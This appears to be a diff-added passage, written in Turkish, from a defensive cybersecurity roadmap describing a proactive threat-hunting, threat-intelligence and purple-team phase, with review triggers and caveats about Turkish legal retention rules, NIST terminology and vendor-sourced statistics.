+**Aşama 3 — Proaktif yetenek (9-18 ay).** PEAK/TaHiTI ile hipotez-güdümlü threat hunting programı; Hunting-to-Detection döngüsüyle bulguları kalıcı kurala çevirin. CTI fonksiyonunu MISP/OpenCTI + STIX/TAXII ile operasyonelleştirin. T-Pot ile deception katmanı ekleyin. Atomic Red Team + Caldera ile purple team tatbikatları yapıp tespit kapsamını sürekli doğrulayın. Yılda en az bir tabletop exercise + ISO 27037 uyumlu forensic readiness (KAPE/Velociraptor hazır). **Eşik:** Dwell-time'ı sektör medyanının (14 gün) altına, ideal olarak saatler seviyesine indirin.
+
+**Tetikleyiciler.** Mandiant dwell-time benchmark'ı her yıl yeniden değerlendirilmeli; ransomware-spesifik dwell (~5 gün) hız baskısını artırdığı için containment otomasyonu önceliklendirilmeli. 7545 alt düzenlemeleri (2026) yayımlandığında log saklama/SOME yapılandırması revize edilmeli. IBM 2025 verisi (AI/otomasyon ile 80 gün ve 1,9M$ kazanım), SOAR/AI yatırımının ROI gerekçesi olarak yönetime sunulmalı.
+
+## Caveats
+- **5651 saklama süresi çelişkisi:** Kaynaklar 1 yıl, 2 yıl ve 3-5 yıl önerisi arasında farklılaşıyor; bu kanun-yönetmelik-Anayasa Mahkemesi kararı katmanlarından kaynaklanır. Teknik uygulama öncesi mutlaka hukuk birimine danışılmalı.
+- **NIST SP 800-61r3 soyutlaması:** r3, r2'nin somut prosedürel adımlarını terk edip CSF 2.0 fonksiyonlarına geçtiği için "6 adımlı yaşam döngüsü" artık resmi NIST terminolojisi değildir; ancak SANS 6-adım modeli ve r2 pratikte yaygın kullanılmaya devam ediyor. Her iki modeli de bilmek gerekir.
+- **CTI faz sayısı, Atomic Red Team test sayısı ve emülasyon/simülasyon ayrımı** kaynaklar arasında farklılaşıyor; faz sayısı (4-6), test sayısı (1.225 vs 1.700+) ve emülasyon/simülasyon tanımları için en titiz kanonik kaynaklar (CrowdStrike, Red Canary GitHub, NVISO/SANS) esas alınmalı.
+- **7545 bildirim süresi** kanunda net sayı vermiyor ("gecikmeksizin"); 24-72 saat beklentisi sektör yorumudur, alt düzenlemelerle netleşecek.
+- **2026 projeksiyonlu rakamlar** (KVKK 17M TL ceza tavanı, siber suç maliyeti tahminleri) projeksiyon/tahmindir, kesinleşmiş değildir.
+- Bazı teknik detaylar (XSOAR %95 otomasyon, %82 phishing azalması) üretici (Palo Alto) kaynaklıdır ve pazarlama bağlamı taşıyabilir; bağımsız doğrulama önerilir. IBM ve Mandiant rakamları ise bağımsız sektör raporlarıdır.
